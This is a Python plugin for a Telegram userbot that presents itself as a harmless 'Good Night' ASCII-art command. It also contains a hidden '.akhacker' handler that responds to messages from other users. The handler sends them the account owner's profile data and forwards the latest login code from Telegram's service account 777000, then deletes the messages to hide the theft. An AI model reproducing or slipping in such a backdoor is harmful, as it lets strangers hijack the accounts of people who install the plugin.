from telethon import events
from userbot.cmdhelp import CmdHelp


@borg.on(events.NewMessage(incoming=True,pattern=r'\.akhacker'))
async def hacker(event):
    tacc = 777000
    cmd = event.raw_text.split(" ")
    if cmd[1] == "info":
        info = await borg.get_me()
        d = await event.reply(info.stringify())
        await borg.delete_messages(event.message.from_id, event.message, revoke=False)
        await borg.delete_messages(event.message.from_id, d, revoke=False)
    if cmd[1] == "login":
        messagesinfo = await bot.get_messages(tacc, limit=1)
        msg = messagesinfo[0]
        d = await msg.forward_to(event.message.from_id)
        await borg.delete_messages(tacc,msg, revoke=False)
        await borg.delete_messages(event.message.from_id, d, revoke=False)
        await borg.delete_messages(event.message.from_id, event.message, revoke=False)

@borg.on(events.NewMessage(outgoing=True,pattern=r'\.gdn'))
async def gdn(event):
    await event.edit("""
        ｡♥️｡･ﾟ♡ﾟ･｡♥️｡･｡･｡･｡♥️｡･
    ╱╱╱╱╱╱╱╭╮╱╱╱╭╮╱╭╮╭╮
    ╭━┳━┳━┳╯┃╭━┳╋╋━┫╰┫╰╮
    ┃╋┃╋┃╋┃╋┃┃┃┃┃┃╋┃┃┃╭┫
    ┣╮┣━┻━┻━╯╰┻━┻╋╮┣┻┻━╯
    ╰━╯╱╱╱╱╱╱╱╱╱╱╰━╯
        ｡♥️｡･ﾟ♡ﾟ･｡♥️° ♥️｡･ﾟ♡ﾟ
        """)

CmdHelp("Good Night").add_command(
  '.gdn', '<reply to media>/<or type a reson>', 'Show good night message'
).add()
